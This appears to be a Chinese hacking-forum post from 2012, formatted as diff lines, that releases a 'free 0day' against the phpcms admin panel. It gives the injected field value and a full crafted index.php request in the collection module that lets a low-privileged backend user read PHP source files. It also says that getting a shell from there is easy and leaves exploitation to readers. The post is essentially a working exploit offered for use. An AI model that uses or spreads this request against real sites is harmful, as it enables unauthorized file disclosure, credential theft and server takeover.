@@ -1,0 +1,16 @@
+
+[【原创】] 【0day】phpcms 后台普通用户读文件(免费了)
+ 
+
+
+
+本帖最后由 testr00ttest 于 2012-8-15 21:35 编辑 
+
+留着也是留着 放出来吧。。。
+ 
+后台采集里设置采集模块中title 或者其他的内容都可以 设置为<?php[内容]?>
+ 
+然后用下面的代码就可以读取到php的源了。
+ index.php?clientid=name&url=./caches/caches_scan/caches_data/scan_bad_file.cache.php&_=1344175735957&m=collection&c=node&a=public_test_content&nodeid=1&pc_hash=xxxx
+ 
+拿到源基本拿到shell不难了。具体如何利用看大家自己了。（别跟我说只会读数据库连接文件，并且还不能连），反正我是可以拿到shell
